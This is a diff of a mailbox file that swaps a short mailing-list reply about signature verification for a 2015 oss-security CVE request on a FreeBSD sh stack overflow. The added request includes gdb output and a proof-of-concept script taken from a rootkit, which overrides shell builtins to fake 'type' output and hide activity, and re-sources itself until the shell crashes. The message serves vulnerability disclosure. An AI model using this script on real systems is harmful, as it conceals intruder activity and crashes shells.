@@ -1,4 +1,9 @@
-Received: (qmail 1413 invoked by uid 550); 1 Jan 2026 06:41:30 -0000
+X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["6296" "Tuesday" "31" "March" "2015" "18:42:01" "+0800" "wzt wzt" "wzt.wzt@gmail.com" "<CAEQi4beSswmoiqOsGHDH8U6rqWDXtyNgHnMmKrYsh+PhZ9PxMw@mail.gmail.com>" "201" "[oss-security] CVE request: freebsd/sh stack overflow vulnerability" nil nil nil "3" "2015033110:42:01" "[oss-security] CVE request: freebsd/sh stack overflow vulnerability" (number mark "        wzt.wzt@gmai Mar 31  201/6296  " thread-indent "\"[oss-security] CVE request: freebsd/sh stack overflow vulnerability\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	nil)
+X-Mozilla-Status: 0001
+X-Mozilla-Status2: 00000000
+Received: (qmail 22043 invoked by uid 550); 31 Mar 2015 11:11:51 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -6,71 +11,226 @@ List-Help: <mailto:oss-security-help@lists.openwall.com>
 List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
-Reply-To: oss-security@lists.openwall.com
-x-ms-reactions: disallow
-Received: (qmail 15394 invoked from network); 31 Dec 2025 22:50:05 -0000
+Received: (qmail 3788 invoked from network); 31 Mar 2015 10:42:13 -0000
 DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=gmail.com; s=20230601; t=1767221395; x=1767826195; darn=lists.openwall.com;
-        h=mime-version:user-agent:message-id:date:references:in-reply-to
-         :subject:cc:to:from:from:to:cc:subject:date:message-id:reply-to;
-        bh=J5uMaq+WmSditgRmTKNWjt/zXZFvZAEHy9sOTx6VXig=;
-        b=ngRZcZe8TviIFf4OC5KP8CnWty1ye0ZWKN97JU54i5nHLxHNCXD1ZwElYRT7m+ppzY
-         naxXwyZzWmIIJBG9ul+Yb0wnVNcsIbGvymr9g0Y0t5gV1H0o436zPoMtTd9IUMyq+RaH
-         OMExCnEr6XfufW3ldp6aLmlVexYeX0Tfy9QtcOuIFR5yhXILOooSO2II18ph0p9T5cm1
-         JonrG0U3a1kXMLLou8nNZgZc252DcSTopfBPo6Iee7T35VaydwLHM5F0Rj44I/gqbhLl
-         9Tzx44C2/7eeu71hNYpah/zqNjwC0sY3nZQ0E1q6s6jA0cTQqYzh52xsRjgZZ1aPorZx
-         oP3g==
-X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=1e100.net; s=20230601; t=1767221395; x=1767826195;
-        h=mime-version:user-agent:message-id:date:references:in-reply-to
-         :subject:cc:to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject
-         :date:message-id:reply-to;
-        bh=J5uMaq+WmSditgRmTKNWjt/zXZFvZAEHy9sOTx6VXig=;
-        b=J29zzJf2U8fyejFP6OpqzxH0o155IJbq+jlHwvSoP+XWJTKnSFK9FUVUr+tvYOZL8c
-         c6QghYZuIEXmE7+HE6vmkedUMGXLE9gGljJ0UBJSIPSwLR3TDJ73RyMTagMF35qLwqKH
-         v4H2h6trrTjAH82Cknb3YQALkR4bqkPZAMDSMabwLEjAS/CwrkcMSX7YT1ABrdeEe9jZ
-         YLSXY5+kYbR+xSElgSEBJHJ7OEOnkCfRTVGmqFgbj3glnfKYBRal9L2GK3fIIMyHV84R
-         QLN7+Klbq4cMIWAkWWwYKr15Rg5hmAGVPDZI5hjRce53dzxp9fayKUaw1T03v081EVMC
-         fHjA==
-X-Forwarded-Encrypted: i=1; AJvYcCW3lYn+xtckPSWlfkiXWmndS8ddWevq1enjVeaRrrNXTOT1k1dV+PrDYn9e9MQizOL3eNK1qlz/8p52C7s=@lists.openwall.com
-X-Gm-Message-State: AOJu0YzG+QNaW/3QAjcwhc2qGMcp8N24PEjb57r/pp2U0dOPJMuQMh2j
-	+Chm03Ek/oQbeny6vqMkzRxmMCsx99GoxLkk/UqNwnWlia5XAq4VfIjRReLxdg==
-X-Gm-Gg: AY/fxX7bBP6rrEuEti6ichrPANeXBF2oM0kRcCjBOFWcMkAleOr2ozwyFLR4qzjt1rB
-	taMm6m+ELchKbPyH77ukWGv2NZjre/WDaFjiQjpsSdFarAE5USe13hsr+hyJlZfe8wXZ9aTZ+oU
-	gnfVHPap1/LT3OGGzvOr+q/AkxRiAxJEvsUGSeq2gWLGCrov69w4qW5OAreoVaW+KtA7bnEsCtW
-	/9XKzTA1Hc+I3AjER8N8kkcbmSI9tIUAmTZ51c49zH6ySEsQHBPbaDmy7sNiVMPv7KtSm+PUfEg
-	MimW5ws8hQzKiOwRf8DuLzTQKu90dIQQ0kz3y0Mkm7yKKa6U6qmg0+FMlZiJJKG8+MqYocR3zsV
-	5GUd0DmvsN+VrG51CvDPkMpBiulgyAqSnrRnUk0OUwYnALAb5ZRmisKRwLZQnDF8+jMUu
-X-Google-Smtp-Source: AGHT+IFgt2xrIfECuX7nUXGpMaKDDADt7P62czLrr7qc7kZ9ATuzlDpOj+qGzQWBAlsr1Ho3rnHt2w==
-X-Received: by 2002:a05:7022:912:b0:11b:9386:a383 with SMTP id a92af1059eb24-12171afd92fmr33924863c88.22.1767221395046;
-        Wed, 31 Dec 2025 14:49:55 -0800 (PST)
-From: Collin Funk <collin.funk1@gmail.com>
-To: Simon Josefsson <simon@josefsson.org>
-Cc: kf503bla@duck.com,  oss-security@lists.openwall.com
-In-Reply-To: <878qei6bq7.fsf@josefsson.org>
-References: <4bb0e4f7-a4f3-45cc-b519-2044b4b2871c@gmail.com>
-	<928709EE-07AA-4995-B9D3-E83AC18353CC.1@smtp-inbound1.duck.com>
-	<6F979157-91AD-4C55-8CCD-5CC5AA18BB50.1@smtp-inbound1.duck.com>
-	<878qei6bq7.fsf@josefsson.org>
-Date: Wed, 31 Dec 2025 14:49:53 -0800
-Message-ID: <87ms2y1d2m.fsf@gmail.com>
-User-Agent: Gnus/5.13 (Gnus v5.13)
+        d=gmail.com; s=20120113;
+        h=mime-version:date:message-id:subject:from:to:content-type;
+        bh=eXBUCabw5U5bQXG/aX+CMlmtkbQo49rj56eEyeNNY0M=;
+        b=q6wKgslr5CNfZJ592Xjd2X0oiydIeRE+JyhKur3mGGcNjE0nEFp2jAFVp2J+dYCBKg
+         DAfKOKi+8pMt7sfKSReT+Y9OdRCBzUVZLKLd6iArQHiqSqZWgS66gd7BSlHEapTOl27I
+         Z3ZNipI6OmGYf6jjxV/lueaHkFn1r4p4HuzNTzj+6HGkxISGC0xDs+s98GkRieB6PeX8
+         KFzfaIU5jJ+EEuMKtMLugqJJBfdSrDGnlf4IdCM6eOZJFuN8HZm18CpxV3/KyRs2Fi82
+         mRYoionJUz2pSr77veEEy3ylANzDxRWas8ywcrmW2b05JBGSFDmNDIPT9xCzey4BG9jV
+         wfMw==
 MIME-Version: 1.0
-Content-Type: text/plain
-Subject: Re: [oss-security] Re: Best practices for signature verifcation
+X-Received: by 10.112.137.164 with SMTP id qj4mr30258585lbb.17.1427798521964;
+ Tue, 31 Mar 2015 03:42:01 -0700 (PDT)
+Message-ID: <CAEQi4beSswmoiqOsGHDH8U6rqWDXtyNgHnMmKrYsh+PhZ9PxMw@mail.gmail.com>
+Content-Type: multipart/alternative; boundary=089e0115fd1cb66cfd0512933f8b
+Date: Tue, 31 Mar 2015 18:42:01 +0800
+From: wzt wzt <wzt.wzt@gmail.com>
+Reply-To: oss-security@lists.openwall.com
+Subject: [oss-security] CVE request: freebsd/sh stack overflow vulnerability
+To: oss-security@lists.openwall.com
 
-Hi Simon,
+--089e0115fd1cb66cfd0512933f8b
+Content-Type: text/plain; charset=UTF-8
+Content-Transfer-Encoding: quoted-printable
 
-Simon Josefsson <simon@josefsson.org> writes:
+hi=EF=BC=9A
+    I found sh have a stack overflow bug on freebsd(9.0-10.0),  it may be
+triggered on all freebsd systems, but i have not tested yet. the poc below
+is tested on freebsd10.0 amd64 arch:
 
-> 6) Sigstore and Sigsum.  (I hope I provoke both camps here too :)) These
-> are modern designs that realize that signatures without transparency is
-> not effective against practical attacks.  Reasonable well specified,
-> although lacking in multiple implementations and PQ options.  Sigstore
-> suffer from complexity and its focus on container security.  Sigsum
-> suffer from lack of non-Go implementations and MIME integration.
+$ ls
+brootkit.sh
+$ . brootkit.sh
+$ command
+$ ls
+brootkit.sh     sh.core
 
-Doesn't Sigstore require a centralized Rekor instance? That was the
-impression I based on a very brief look at it previously.
+(gdb) x/16x $rsp+0x1b8
+0x7fffdfffeff8: Cannot access memory at address 0x7fffdfffeff8
+(gdb) x/16x $rsp+0x1c0
+0x7fffdffff000: 0x0000000000000000      0x0000000000000000
+0x7fffdffff010: 0x0000000000000000      0x0000000000000000
+0x7fffdffff020: 0x0000000000000000      0x0000000000000000
+0x7fffdffff030: 0x0000000000000000      0x0000000000000000
+0x7fffdffff040: 0x0000000000000000      0x0000000000000000
+0x7fffdffff050: 0x0000000000000000      0x0000000000000000
+0x7fffdffff060: 0x0000000000000000      0x0000000000000000
+0x7fffdffff070: 0x0000000000000000      0x0000000000000000
 
-Collin
+(gdb) disass malloc malloc+32
+Dump of assembler code from 0x800d593f0 to 0x800d59410:
+0x0000000800d593f0 <malloc+0>:  push   %rbp
+0x0000000800d593f1 <malloc+1>:  mov    %rsp,%rbp
+0x0000000800d593f4 <malloc+4>:  push   %r15
+0x0000000800d593f6 <malloc+6>:  push   %r14
+0x0000000800d593f8 <malloc+8>:  push   %r13
+0x0000000800d593fa <malloc+10>: push   %r12
+0x0000000800d593fc <malloc+12>: push   %rbx
+0x0000000800d593fd <malloc+13>: sub    $0x488,%rsp
+0x0000000800d59404 <malloc+20>: mov    %rdi,-0x4a0(%rbp)
+0x0000000800d5940b <malloc+27>: mov    0x2c2dbe(%rip),%rax        #
+0x80101c1d0 <__nsdefaultsrc+4928>
+
+
+set $i=3D0
+set $addr=3D$rbp
+while ($i <=3D 1000)
+printf "frame[%d] 0x%lx =3D=3D> 0x%lx retaddr: 0x%lx\t diass: ", $i, $addr,
+*(long *)$addr, *(long *)($addr+8)
+x/i  *(long *)($addr+8)
+set $i=3D$i+1
+set $addr=3D*(long *)$addr
+end
+
+frame[98] 0x7fffe0004c00 =3D=3D> 0x7fffe0004d60 retaddr: 0x406465    diass:
+0x406465 <execve@plt+14073>:    incq   0x21d694(%rip)        # 0x623b00
+<environ+64>
+frame[99] 0x7fffe0004d60 =3D=3D> 0x7fffe0004e10 retaddr: 0x40513b    diass:
+0x40513b <execve@plt+9167>:     mov    -0x74(%rbp),%r14d
+frame[100] 0x7fffe0004e10 =3D=3D> 0x7fffe0004ec0 retaddr: 0x405118   diass:
+0x405118 <execve@plt+9132>:     cmpl   $0x0,0x21e9f5(%rip)        #
+0x623b14 <environ+84>
+
+poc:
+
+#!/bin/sh
+
+BR_ROOTKIT_PATH=3D"."
+
+builtin()
+{
+        local fake_a
+
+        unset command
+        case $1 in
+                "set"|"unset"|"command"|"type")
+                        fake_a=3D"$(command builtin $1 $2)"
+                        br_hide_engine "$fake_a"
+                        reset_command
+                        return ;;
+                "builtin")
+                        echo "sh: builtin: builtin: syntax error, sh is not
+support."
+                        reset_command
+                        return ;;
+                *)
+                        command builtin $1 $2
+                        reset_command
+                        ;;
+        esac
+}
+
+type()
+{
+        case $1 in
+                "builtin"|"set"|"unset"|"type")
+                        echo "$1 is a shell builtin"
+                        return ;;
+                "dir")
+                        echo "dir is /usr/bin/dir"
+                        return ;;
+                "ls")
+                        echo "ls is aliased to ls --color=3Dtty"
+                        return ;;
+                "ps")
+                        echo "ps is /bin/ps"
+                        return ;;
+                "netstat")
+                        echo "netstat is hashed (/usr/bin/netstat)"
+                        return ;;
+                "/bin/ls"|"/usr/bin/dir"|"/bin/ps"|"/usr/bin/netstat")
+                        echo "$1 is $1"
+                        return ;;
+                *)
+                        unset command
+                        command type $1 $2
+                        reset_command
+                        return ;;
+        esac
+}
+
+fake_unset()
+{
+        case $1 in
+                "builtin"|"command"|"set"|"unset"|"type")
+                        echo "sh: syntax error, sh is not support."
+                        return ;;
+                *)
+                        unset $1 $2
+                        return ;;
+        esac
+}
+
+fake_command()
+{
+        case $1 in
+                "builtin"|"command"|"set"|"unset"|"type")
+                        echo "sh: syntax error, sh is not support."
+                        return ;;
+                *)
+                        unset command
+                        command $1 $2
+                        reset_command
+                        return ;;
+        esac
+}
+
+command()
+{
+        case $1 in
+                "builtin")
+                        builtin $2 $3
+                        return ;;
+                "unset")
+                        fake_unset $2 $3
+                        . $BR_ROOTKIT_PATH/brootkit.sh
+                        return ;;
+                "type")
+                        type $2 $3
+                        return ;;
+                "command")
+                        fake_command $2 $3
+                        return ;;
+                *)
+                        unset command
+                        command $2 $3
+                        . $BR_ROOTKIT_PATH/brootkit.sh
+                        return ;;
+        esac
+}
+
+reset_command()
+{
+        command()
+        {
+                case $1 in
+                        "builtin")
+                                builtin $2 $3
+                                return ;;
+                        "set")
+                                set $2 $3
+                                return ;;
+                        "unset")
+                                fake_unset $2 $3
+                                . $BR_ROOTKIT_PATH/brootkit.sh
+                                return ;;
+                        "type")
+                                type $2 $3
+                                return ;;
+                        "command")
+                                fake_command $2 $3
+                                return ;;
+                        *)
+                                unset command
+                                command $2 $3
+                                . $BR_ROOTKIT_PATH/brootkit.sh
+                                return ;;
+                esac
+        }
+}
+
+--089e0115fd1cb66cfd0512933f8b--
